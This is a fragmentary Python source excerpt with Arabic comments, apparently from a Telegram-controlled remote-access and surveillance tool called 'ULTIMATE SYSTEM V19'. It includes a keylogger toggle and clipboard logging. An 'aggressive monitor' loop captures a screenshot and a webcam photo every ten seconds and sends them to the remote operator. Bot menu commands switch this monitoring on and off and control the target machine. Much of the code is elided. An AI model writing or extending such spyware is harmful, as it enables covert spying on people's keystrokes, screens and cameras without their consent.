...
FLAGS = {
    "keylogger": False,
    "aggressive_monitor": False, # لتفعيل الحفظ كل 10 ثواني
    "video_rec": False
}
LOGGED_KEYS = []
CLIPBOARD_HISTORY = []
...
# قائمة التجاهل (من laptop_44) لمنع نسخ نصوص الأزرار للحافظة
IGNORE_TEXTS = [
...
def auto_monitor_loop():
    ...
    while True:
        ...
        # 3. وضع المراقبة العدواني (من laptop_44) - يحفظ كل 10 ثواني
        if FLAGS["aggressive_monitor"] and (time.time() - last_save_time > 10):
            try:
                # لقطة شاشة
                scr_path = os.path.join(SAVE_DIR, "auto_scr.png") # مؤقت للإرسال
                pyautogui.screenshot(scr_path)
                send_sync_photo(scr_path, caption=f"🖥️ Auto (10s): {timestamp}")
                
                # صورة كاميرا
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    cam_path = os.path.join(CAM_FOLDER, f"Cam_{ts_file}.jpg") # حفظ دائم
                    cv2.imwrite(cam_path, frame)
                    send_sync_photo(cam_path, caption=f"👁️ Auto Cam: {timestamp}")
                cap.release()
...
async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    # --- الأمان (Keylogger) ---
        ...
        await update.message.reply_text("🛑 Keylogger Stopped. Saving...")
        if LOGGED_KEYS:
    ...
    # --- وضع المراقبة المستمر (خاصية laptop_44) ---
    elif msg == "🔄 تشغيل Auto-Mode":
        FLAGS["aggressive_monitor"] = True
        await update.message.reply_text("✅ تم تفعيل المراقبة المستمرة (حفظ كل 10 ثواني).")
    elif msg == "⏹ إيقاف Auto-Mode":
        FLAGS["aggressive_monitor"] = False
        await update.message.reply_text("🛑 تم إيقاف المراقبة المستمرة.")

    # --- الصوت (خاصية laptop_44: التكرار 5 مرات) ---
    elif msg == "🔊 رفع": 
        [pyautogui.press('volumeup') for _ in range(5)]
        await update.message.reply_text("🔊 Up")
    elif msg == "🔉 خفض": 
        [pyautogui.press('volumedown') for _ in range(5)]
        await update.message.reply_text("🔉 Down")
    elif msg == "🔇 كتم": 
...
# ==========================================
# ⚡ معالجات النصوص (Smart Copy)
# ==========================================

async def smart_copy_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """نسخ أي نص مرسل للحافظة (خاصية laptop_44)"""
    if not is_targeted(): return
    if not is_admin(update.effective_user.id): return
    
    txt = update.message.text
    # تجاهل الأوامر ونصوص الأزرار
...
async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if txt.startswith("/msg "): 
        ...
        # طريقة XML للاتصال (من laptop_44)
        try:
...
def main():
    print(f"🚀 ULTIMATE SYSTEM V19 (MERGED): {DEVICE_ID}")
